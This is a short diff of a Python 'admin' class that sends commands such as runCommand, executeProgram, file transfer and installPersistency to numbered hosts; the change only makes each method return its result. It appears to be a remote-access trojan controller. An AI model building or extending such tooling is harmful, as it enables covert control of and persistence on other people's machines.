@@ -27,23 +27,23 @@ class admin:
 
     def sendFile(self,fname,uid=0):
         json={"CMD":"sendFile","uid":uid,"fname":fname}
-        self.doRequest(json)
+        return self.doRequest(json)
 
     def downloadFile(self,fname,uid=0):
         json={"CMD":"downloadFile","uid":uid,"fname":fname}
-        self.doRequest(json)
+        return self.doRequest(json)
 
     def executeProgram(self,fname,uid=0):
         json={"CMD":"executeProgram","uid":uid,"fname":fname}
-        self.doRequest(json)
+        return self.doRequest(json)
 
     def runCommand(self,cmd,uid=0):
         json={"CMD":"runCommand","cmdString":cmd,"uid":uid}
-        self.doRequest(json)
+        return self.doRequest(json)
     
     def install(self,uid=0):
         json={"CMD":"installPersistency","uid":uid}
-        self.doRequest(json)
+        return self.doRequest(json)
 
     def testServer(self):
         json={"CMD":"testServer"}
